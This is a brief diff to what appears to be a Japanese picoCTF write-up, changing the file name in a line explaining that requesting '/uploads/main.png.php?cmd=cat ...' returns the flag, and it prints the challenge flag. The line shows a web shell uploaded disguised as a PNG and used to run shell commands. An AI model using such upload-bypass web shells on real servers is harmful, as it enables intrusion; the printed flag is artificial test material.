@@ -65,7 +65,7 @@ PNG
 /var/www/html/instructions.txt
 /var/www/html/robots.txt
 ```
-`/uploads/main.png.php?cmd=cat /var/www/html/MFRDAZLDMUYDG.txt`へアクセスすると，flagが得られる．
+`/uploads/main.png.php?cmd=cat /var/www/html/GQ4DOOBVMMYGK.txt`へアクセスすると，flagが得られる．
 ```
 PNG
 /* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e} */
